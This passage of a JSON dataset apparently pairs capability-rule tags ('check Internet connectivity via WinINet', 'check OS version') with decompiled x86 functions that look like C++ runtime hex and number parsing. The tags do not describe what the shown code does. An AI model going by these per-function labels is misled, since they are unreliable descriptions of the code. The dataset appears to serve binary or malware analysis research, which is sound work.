*(iVar1 + 6));\n            if (0x15 < uVar7) break;\n            if (iVar13 < 8) {\n                *puVar16 = *(uVar7 + 0x475a50);\n                puVar16 = puVar16 + 1;\n                iVar13 = iVar13 + 1;\n            }\n            *(unaff_EBP + -0x7d) = 1;\n            fcn.0042eb11();\n        }\n    }\ncode_r0x0042c244:\n    cVar4 = *(unaff_EBP + -0x7d);\ncode_r0x0042c247:\n    if ((*(unaff_EBP + -0x7e) != '\\0') || (cVar4 == '\\0')) {\n        puVar16 = *(unaff_EBP + -0xa8);\n    }\n    puVar9 = *(unaff_EBP + -0xac);\n    uVar14 = *(unaff_EBP + -0x8c);\n    *puVar16 = 0;\n    *puVar9 = uVar14;\n    fcn.00406810();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 5190
    },
    "0042c278": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1eh\n\nvoid __cdecl fcn.0042c278(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uchar *puVar3;\n    char cVar4;\n    int16_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int16_t iVar10;\n    int32_t iVar11;\n    char *pcVar12;\n    int32_t unaff_EBP;\n    int32_t iVar13;\n    uint uVar14;\n    ushort *puVar15;\n    ushort *puVar16;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_1eh;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0043ad07(0xa0);\n    iVar13 = *(unaff_EBP + 0x18);\n    iVar1 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0xa8) = *(unaff_EBP + 0xc);\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0xac) = *(unaff_EBP + 0x1c);\n    fcn.00421bb3(uVar14);\n    *(unaff_EBP + -4) = 0;\n    piVar6 = fcn.00428f0b(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x9c) = piVar6;\n    fcn.00401990();\n    pcVar2 = *(*piVar6 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x7c);\n    (*pcVar2)();\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    fcn.00421bb3(uVar14);\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.004284ab(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 1;\n    fcn.00401990();\n    pcVar2 = *(*piVar6 + 0x2c);\n    (**0x4742a4)(\"0123456789ABCDEFabcdef-+XxPp\", 0x475a8d, unaff_EBP + -0x4c);\n    (*pcVar2)();\n    uVar14 = *(unaff_EBP + -0x88);\n    puVar15 = *(unaff_EBP + -0xa8);\n    *(unaff_EBP + -0x7e) = 0;\n    cVar4 = fcn.00435185(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar1 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar10 = *(iVar1 + 6);\n        if (iVar10 == *(unaff_EBP + -0x1e)) {\n            *puVar15 = 0x2b;\n        }\n        else {\n            if (*(iVar1 + 4) == '\\0') {\n                fcn.00430056();\n                iVar10 = *(iVar1 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x0042c3ac;\n            *puVar15 = 0x2d;\n        }\n        puVar15 = puVar15 + 1;\n        fcn.0042eb11();\n    }\ncode_r0x0042c3ac:\n    *puVar15 = 0x7830;\n    puVar15 = puVar15 + 1;\n    *(unaff_EBP + -0x7d) = 0;\n    *(unaff_EBP + -0x84) = puVar15;\n    *(unaff_EBP + -0x94) = 0;\n    *(unaff_EBP + -0x8c) = 0;\n    cVar4 = fcn.00435185(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar1 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        if (*(iVar1 + 6) == *(unaff_EBP + -0x4c)) {\n            fcn.0042eb11();\n            cVar4 = fcn.00435185(uVar14);\n            if (cVar4 == '\\0') {\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                iVar10 = *(iVar1 + 6);\n                if (iVar10 != *(unaff_EBP + -0x1a)) {\n                    if (*(iVar1 + 4) == '\\0') {\n                        fcn.00430056();\n                        iVar10 = *(iVar1 + 6);\n                    }\n                    if (iVar10 != *(unaff_EBP + -0x1c)) goto code_r0x0042c436;\n                }\n                fcn.0042eb11();\n            }\n            else {\ncode_r0x0042c436:\n                *(unaff_EBP + -0x7d) = 1;\n            }\n        }\n    }\n    *(unaff_EBP + -0xa0) = ((**(unaff_EBP + -0xac) != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar12 = unaff_EBP + -0x7c;\n    *(unaff_EBP + -0x98) = pcVar12;\n    if (0xf < *(unaff_EBP + -0x68)) {\n        pcVar12 = *(unaff_EBP + -0x7c);\n        *(unaff_EBP + -0x98) = pcVar12;\n    }\n    if ((*pcVar12 == '\\x7f') || (*pcVar12 < '\\x01')) {\n        cVar4 = fcn.00435185(uVar14);\n        if (cVar4 == '\\0') {\n            do {\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                uVar7 = fcn.0042758d(unaff_EBP + -0x4c, *(iVar1 + 6));\n                if (0x15 < uVar7) break;\n                iVar13 = *(unaff_EBP + -0x94);\n                if (*(unaff_EBP + -0xa0) == iVar13 || *(unaff_EBP + -0xa0) < iVar13) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar13 != 0)) {\n                    *puVar15 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x94) = iVar13 + 1;\n                }\n                *(unaff_EBP + -0x7d) = 1;\n                fcn.0042eb11();\n                cVar4 = fcn.00435185(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x84) = puVar15;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x6c) == 0) {\n            *(unaff_EBP + -0x90) = 0;\n        }\n        else {\n            pcVar2 = *(**(unaff_EBP + -0x9c) + 0x10);\n            (**0x4742a4)();\n            uVar7 = (*pcVar2)();\n            *(unaff_EBP + -0x90) = uVar7 & 0xffff;\n        }\n        *(unaff_EBP + -0x54) = 0;\n        *(unaff_EBP + -0x50) = 0xf;\n        *(unaff_EBP + -100) = 0;\n        fcn.0040acd0(1, 0);\n        *(unaff_EBP + -4) = 3;\n        iVar13 = 0;\n        cVar4 = fcn.00435185(*(unaff_EBP + -0x88));\n        if (cVar4 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x50);\n            iVar8 = *(unaff_EBP + -100);\ncode_r0x0042c5fe:\n            do {\n                pcVar12 = *(unaff_EBP + -0x98);\n                while( true ) {\n                    if ((iVar13 == 0) || (cVar4 = *pcVar12,  cVar4 == '\\x7f')) goto code_r0x0042c679;\n                    iVar13 = iVar13 + -1;\n                    if (iVar13 != 0) {\n                        *(unaff_EBP + -0x90) = unaff_EBP + -100;\n                        if (0xf < uVar7) {\n                            *(unaff_EBP + -0x90) = iVar8;\n                        }\n                        puVar15 = *(unaff_EBP + -0x84);\n                        if (cVar4 != *(*(unaff_EBP + -0x90) + iVar13)) goto code_r0x0042c675;\n                    }\n                    if (iVar13 == 0) {\n                        *(unaff_EBP + -0x90) = unaff_EBP + -100;\n                        if (0xf < uVar7) {\n                            *(unaff_EBP + -0x90) = iVar8;\n                        }\n                        puVar15 = *(unaff_EBP + -0x84);\n                        if (cVar4 < **(unaff_EBP + -0x90)) goto code_r0x0042c675;\n                    }\n                    pcVar12 = *(unaff_EBP + -0x98) + 1;\n                    if (*pcVar12 < '\\x01') break;\n                    *(unaff_EBP + -0x98) = pcVar12;\n                }\n            } while( true );\n        }\n        do {\n            if (*(iVar1 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            uVar7 = fcn.0042758d(unaff_EBP + -0x4c, *(iVar1 + 6));\n            if (uVar7 < 0x16) {\n                iVar8 = *(unaff_EBP + -0x94);\n                *(unaff_EBP + -0x7d) = 1;\n                if (*(unaff_EBP + -0xa0) == iVar8 || *(unaff_EBP + -0xa0) < iVar8) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *puVar15 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x84) = puVar15;\n                    *(unaff_EBP + -0x94) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -100;\n                if (0xf < *(unaff_EBP + -0x50)) {\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (*(iVar8 + iVar13) != '\\x7f') {\n                    iVar8 = unaff_EBP + -100;\n                    if (0xf < *(unaff_EBP + -0x50)) {\n                        iVar8 = *(unaff_EBP + -100);\n                    }\n                    *(iVar8 + iVar13) = *(iVar8 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x50);\n                iVar8 = *(unaff_EBP + -100);\n                iVar11 = unaff_EBP + -100;\n                if (0xf < uVar7) {\n                    iVar11 = iVar8;\n                }\n                if ((*(iVar11 + iVar13) == '\\0') || (*(unaff_EBP + -0x90) == 0)) goto code_r0x0042c5dd;\n                iVar10 = *(iVar1 + 6);\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar10 = *(iVar1 + 6);\n                    uVar7 = *(unaff_EBP + -0x50);\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (iVar10 != *(unaff_EBP + -0x90)) goto code_r0x0042c5dd;\n                fcn.00406de0(1, 0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.0042eb11();\n            cVar4 = fcn.00435185(*(unaff_EBP + -0x88));\n        } while (cVar4 == '\\0');\n        uVar7 = *(unaff_EBP + -0x50);\n        iVar8 = *(unaff_EBP + -100);\ncode_r0x0042c5dd:\n        if (iVar13 == 0) goto code_r0x0042c5fe;\n        iVar11 = unaff_EBP + -100;\n        if (0xf < uVar7) {\n            iVar11 = iVar8;\n        }\n        if ('\\0' < *(iVar11 + iVar13)) {\n            iVar13 = iVar13 + 1;\n            goto code_r0x0042c5fe;\n        }\ncode_r0x0042c675:\n        *(unaff_EBP + -0x7e) = 1;\ncode_r0x0042c679:\n        *(unaff_EBP + -4) = 1;\n        fcn.00406810();\n        uVar14 = *(unaff_EBP + -0x88);\n    }\n    if ((*(unaff_EBP + -0x7d) != '\\0') && (*(unaff_EBP + -0x94) == 0)) {\n        *puVar15 = 0x30;\n        puVar15 = puVar15 + 1;\n        *(unaff_EBP + -0x84) = puVar15;\n    }\n    cVar4 = fcn.00435185(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar1 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar10 = *(iVar1 + 6);\n        pcVar2 = *(**(unaff_EBP + -0x9c) + 0xc);\n        (**0x4742a4)();\n        iVar5 = (*pcVar2)();\n        if (iVar10 == iVar5) {\n            puVar9 = fcn.0045b6c6();\n            puVar3 = *(unaff_EBP + -0x84);\n            *puVar3 = **puVar9;\n            puVar15 = puVar3 + 1;\n            *(unaff_EBP + -0x84) = puVar15;\n            fcn.0042eb11();\n        }\n        else {\n            puVar15 = *(unaff_EBP + -0x84);\n        }\n        uVar14 = *(unaff_EBP + -0x88);\n    }\n    if (*(unaff_EBP + -0x94) == 0) {\n        cVar4 = fcn.00435185(uVar14);\n        if (cVar4 == '\\0') {\n            iVar13 = *(unaff_EBP + -0x8c);\n            do {\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                if (*(iVar1 + 6) != *(unaff_EBP + -0x4c)) break;\n                *(unaff_EBP + -0x7d) = 1;\n                iVar13 = iVar13 + -1;\n                fcn.0042eb11();\n                cVar4 = fcn.00435185(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x8c) = iVar13;\n            puVar15 = *(unaff_EBP + -0x84);\n        }\n        iVar13 = *(unaff_EBP + -0x8c);\n        if (iVar13 < 0) {\n            *puVar15 = 0x30;\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x8c) = iVar13 + 1;\n        }\n    }\n    while( true ) {\n        cVar4 = fcn.00435185(uVar14);\n        if (cVar4 != '\\0') break;\n        if (*(iVar1 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        uVar7 = fcn.0042758d(unaff_EBP + -0x4c, *(iVar1 + 6));\n        if (0x15 < uVar7) break;\n        iVar13 = *(unaff_EBP + -0x94);\n        if (iVar13 < *(unaff_EBP + -0xa0)) {\n            *puVar15 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x94) = iVar13 + 1;\n        }\n        *(unaff_EBP + -0x7d) = 1;\n        fcn.0042eb11();\n    }\n    cVar4 = *(unaff_EBP + -0x7d);\n    puVar16 = puVar15;\n    if (cVar4 == '\\0') goto code_r0x0042c9a7;\n    cVar4 = fcn.00435185(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar1 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar10 = *(iVar1 + 6);\n        if (iVar10 != *(unaff_EBP + -0x16)) {\n            if (*(iVar1 + 4) == '\\0') {\n                fcn.00430056();\n                iVar10 = *(iVar1 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x18)) goto code_r0x0042c9a4;\n        }\n        *puVar15 = 0x70;\n        puVar16 = puVar15 + 1;\n        fcn.0042eb11();\n        iVar13 = 0;\n        *(unaff_EBP + -0x7d) = 0;\n        *(unaff_EBP + -0xa0) = 0;\n        cVar4 = fcn.00435185(*(unaff_EBP + -0x88));\n        if (cVar4 == '\\0') {\n            if (*(iVar1 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            iVar10 = *(iVar1 + 6);\n            if (iVar10 == *(unaff_EBP + -0x1e)) {\n                *puVar16 = 0x2b;\n            }\n            else {\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar10 = *(iVar1 + 6);\n                }\n                if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x0042c901;\n                *puVar16 = 0x2d;\n            }\n            puVar16 = puVar15 + 1;\n            fcn.0042eb11();\n        }\ncode_r0x0042c901:\n        cVar4 = fcn.00435185(*(unaff_EBP + -0x88));\n        if (cVar4 == '\\0') {\n            uVar14 = *(unaff_EBP + -0x88);\n            do {\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                if (*(iVar1 + 6) != *(unaff_EBP + -0x4c)) break;\n                *(unaff_EBP + -0x7d) = 1;\n                fcn.0042eb11();\n                cVar4 = fcn.00435185(uVar14);\n            } while (cVar4 == '\\0');\n            iVar13 = *(unaff_EBP + -0xa0);\n            if (*(unaff_EBP + -0x7d) != '\\0') {\n                *puVar16 = 0x30;\n                puVar16 = puVar16 + 1;\n            }\n        }\n        while( true ) {\n            cVar4 = fcn.00435185(*(unaff_EBP + -0x88));\n            if (cVar4 != '\\0') break;\n            if (*(iVar1 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            uVar7 = fcn.0042758d(unaff_EBP + -0x4c, *(iVar1 + 6));\n            if (0x15 < uVar7) break;\n            if (iVar13 < 8) {\n                *puVar16 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n                puVar16 = puVar16 + 1;\n                iVar13 = iVar13 + 1;\n            }\n            *(unaff_EBP + -0x7d) = 1;\n            fcn.0042eb11();\n        }\n    }\ncode_r0x0042c9a4:\n    cVar4 = *(unaff_EBP + -0x7d);\ncode_r0x0042c9a7:\n    if ((*(unaff_EBP + -0x7e) != '\\0') || (cVar4 == '\\0')) {\n        puVar16 = *(unaff_EBP + -0xa8);\n    }\n    puVar9 = *(unaff_EBP + -0xac);\n    uVar14 = *(unaff_EBP + -0x8c);\n    *puVar16 = 0;\n    *puVar9 = uVar14;\n    fcn.00406810();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 5231
    },
    "0042cc80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_16h\n\nvoid __cdecl fcn.0042cc80(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    int32_t unaff_EBP;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_78h;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x88);\n    iVar8 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0x1c);\n    piVar5 = fcn.00428e65(*(unaff_EBP + 0x1c));\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x78);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x68) == 0) {\n        *(unaff_EBP + -0x90) = 0;\n    }\n    else {\n        pcVar2 = *(*piVar5 + 0x10);\n        (**0x4742a4)();\n        uVar12 = (*pcVar2)();\n        *(unaff_EBP + -0x90) = uVar12 & 0xffff;\n    }\n    piVar5 = fcn.00428405(*(unaff_EBP + -0x80));\n    pcVar2 = *(*piVar5 + 0x2c);\n    (**0x4742a4)(0x4759f4, 0x475a0f, unaff_EBP + -0x48);\n    (*pcVar2)();\n    puVar10 = *(unaff_EBP + -0x94);\n    *(unaff_EBP + -0x84) = puVar10;\n    cVar3 = fcn.00435185(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 == *(unaff_EBP + -0x1a)) {\n            *puVar10 = 0x2b;\n        }\n        else {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00430056();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x1c)) goto code_r0x0042cd81;\n            *puVar10 = 0x2d;\n        }\n        *(unaff_EBP + -0x84) = puVar10 + 1;\n        fcn.0042eb11();\n    }\ncode_r0x0042cd81:\n    uVar12 = *(unaff_EBP + 0x18) & 0xe00;\n    *(unaff_EBP + -0x80) = 10;\n    if (uVar12 == 0x400) {\n        uVar11 = 8;\n    }\n    else if (uVar12 == 0x800) {\n        uVar11 = 0x10;\n    }\n    else {\n        uVar11 = -(uVar12 != 0) & 10;\n    }\n    *(unaff_EBP + -0x79) = 0;\n    *(unaff_EBP + -0x8c) = 0;\n    *(unaff_EBP + -0x7a) = 0;\n    cVar3 = fcn.00435185(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        if (*(iVar8 + 6) != *(unaff_EBP + -0x48)) goto code_r0x0042ce5f;\n        *(unaff_EBP + -0x79) = 1;\n        *(unaff_EBP + -0x8c) = 1;\n        fcn.0042eb11();\n        cVar3 = fcn.00435185(*(unaff_EBP + -0x88));\n        if (cVar3 != '\\0') {\ncode_r0x0042ce58:\n            if (uVar11 == 0) {\n                uVar11 = 8;\n                goto code_r0x0042ce5f;\n            }\n            goto code_r0x0042ce63;\n        }\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 != *(unaff_EBP + -0x16)) {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00430056();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x18)) goto code_r0x0042ce58;\n        }\n        if ((uVar11 != 0) && (uVar11 != 0x10)) goto code_r0x0042ce58;\n        uVar11 = 0x10;\n        *(unaff_EBP + -0x79) = 0;\n        *(unaff_EBP + -0x8c) = 0;\n        fcn.0042eb11();\ncode_r0x0042ce67:\n        *(unaff_EBP + -0x80) = ((uVar11 != 8) - 1 & 0xfffffff2) + 0x16;\n    }\n    else {\ncode_r0x0042ce5f:\n        if (uVar11 != 0) {\ncode_r0x0042ce63:\n            if (uVar11 != 10) goto code_r0x0042ce67;\n        }\n    }\n    *(unaff_EBP + -0x50) = 0;\n    *(unaff_EBP + -0x4c) = 0xf;\n    *(unaff_EBP + -0x60) = 0;\n    fcn.0040acd0(1, *(unaff_EBP + -0x8c));\n    *(unaff_EBP + -4) = 1;\n    iVar13 = 0;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x94) + 0x1f;\n    cVar3 = fcn.00435185(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        do {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            uVar12 = fcn.0042758d(unaff_EBP + -0x48, *(iVar8 + 6));\n            if (uVar12 < *(unaff_EBP + -0x80)) {\n                cVar1 = *(unaff_EBP + -0x7a);\n                cVar3 = *(uVar12 + 0x4759f4);\n                pcVar9 = *(unaff_EBP + -0x84);\n                *pcVar9 = cVar3;\n                if (((cVar1 != '\\0') || (cVar3 != '0')) && (pcVar9 < *(unaff_EBP + -0x8c))) {\n                    *(unaff_EBP + -0x7a) = 1;\n                    *(unaff_EBP + -0x84) = pcVar9 + 1;\n                }\n                iVar6 = unaff_EBP + -0x60;\n                *(unaff_EBP + -0x79) = 1;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (*(iVar6 + iVar13) != '\\x7f') {\n                    iVar6 = unaff_EBP + -0x60;\n                    if (0xf < *(unaff_EBP + -0x4c)) {\n                        iVar6 = *(unaff_EBP + -0x60);\n                    }\n                    *(iVar6 + iVar13) = *(iVar6 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                iVar6 = *(unaff_EBP + -0x60);\n                iVar7 = unaff_EBP + -0x60;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    iVar7 = iVar6;\n                }\n                if ((*(iVar7 + iVar13) == '\\0') || (*(unaff_EBP + -0x90) == 0)) goto code_r0x0042cfa2;\n                iVar4 = *(iVar8 + 6);\n                if (*(iVar8 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar4 = *(iVar8 + 6);\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (iVar4 != *(unaff_EBP + -0x90)) goto code_r0x0042cfa2;\n                fcn.00406de0(1, 0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.0042eb11();\n            cVar3 = fcn.00435185(*(unaff_EBP + -0x88));\n        } while (cVar3 == '\\0');\n        iVar6 = *(unaff_EBP + -0x60);\ncode_r0x0042cfa2:\n        uVar12 = *(unaff_EBP + -0x4c);\n        if (iVar13 != 0) {\n            iVar8 = unaff_EBP + -0x60;\n            if (0xf < uVar12) {\n                iVar8 = iVar6;\n            }\n            if (*(iVar8 + iVar13) < '\\x01') {\n                cVar3 = '\\0';\n                goto code_r0x0042cfc9;\n            }\n            iVar13 = iVar13 + 1;\n        }\n    }\n    else {\n        iVar6 = *(unaff_EBP + -0x60);\n        uVar12 = *(unaff_EBP + -0x4c);\n    }\n    cVar3 = *(unaff_EBP + -0x79);\ncode_r0x0042cfc9:\n    pcVar9 = unaff_EBP + -0x78;\n    if (0xf < *(unaff_EBP + -100)) {\n        pcVar9 = *(unaff_EBP + -0x78);\n    }\n    if (cVar3 == '\\0') {\ncode_r0x0042d043:\n        puVar10 = *(unaff_EBP + -0x94);\n    }\n    else {\n        while ((iVar13 != 0 && (cVar3 = *pcVar9,  cVar3 != '\\x7f'))) {\n            iVar13 = iVar13 + -1;\n            if (iVar13 != 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < uVar12) {\n                    uVar12 = *(unaff_EBP + -0x4c);\n                    *(unaff_EBP + -0x80) = *(unaff_EBP + -0x60);\n                }\n                iVar6 = *(unaff_EBP + -0x60);\n                if (cVar3 != *(*(unaff_EBP + -0x80) + iVar13)) goto code_r0x0042d043;\n            }\n            if (iVar13 == 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    *(unaff_EBP + -0x80) = iVar6;\n                }\n                uVar12 = *(unaff_EBP + -0x4c);\n                if (cVar3 < **(unaff_EBP + -0x80)) goto code_r0x0042d043;\n            }\n            if ('\\0' < pcVar9[1]) {\n                pcVar9 = pcVar9 + 1;\n            }\n        }\n        puVar10 = *(unaff_EBP + -0x84);\n        if (*(unaff_EBP + -0x7a) == '\\0') {\n            *puVar10 = 0x30;\n            puVar10 = puVar10 + 1;\n        }\n    }\n    *puVar10 = 0;\n    fcn.00406810();\n    fcn.00406810();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 3076
    },
    "0042d064": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_16h\n\nvoid __cdecl fcn.0042d064(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    int32_t unaff_EBP;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_78h;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x88);\n    iVar8 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0x1c);\n    piVar5 = fcn.00428f0b(*(unaff_EBP + 0x1c));\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x78);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x68) == 0) {\n        *(unaff_EBP + -0x90) = 0;\n    }\n    else {\n        pcVar2 = *(*piVar5 + 0x10);\n        (**0x4742a4)();\n        uVar12 = (*pcVar2)();\n        *(unaff_EBP + -0x90) = uVar12 & 0xffff;\n    }\n    piVar5 = fcn.004284ab(*(unaff_EBP + -0x80));\n    pcVar2 = *(*piVar5 + 0x2c);\n    (**0x4742a4)(\"0123456789ABCDEFabcdef-+Xx\", 0x475a47, unaff_EBP + -0x48);\n    (*pcVar2)();\n    puVar10 = *(unaff_EBP + -0x94);\n    *(unaff_EBP + -0x84) = puVar10;\n    cVar3 = fcn.00435185(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 == *(unaff_EBP + -0x1a)) {\n            *puVar10 = 0x2b;\n        }\n        else {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00430056();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x1c)) goto code_r0x0042d165;\n            *puVar10 = 0x2d;\n        }\n        *(unaff_EBP + -0x84) = puVar10 + 1;\n        fcn.0042eb11();\n    }\ncode_r0x0042d165:\n    uVar12 = *(unaff_EBP + 0x18) & 0xe00;\n    *(unaff_EBP + -0x80) = 10;\n    if (uVar12 == 0x400) {\n        uVar11 = 8;\n    }\n    else if (uVar12 == 0x800) {\n        uVar11 = 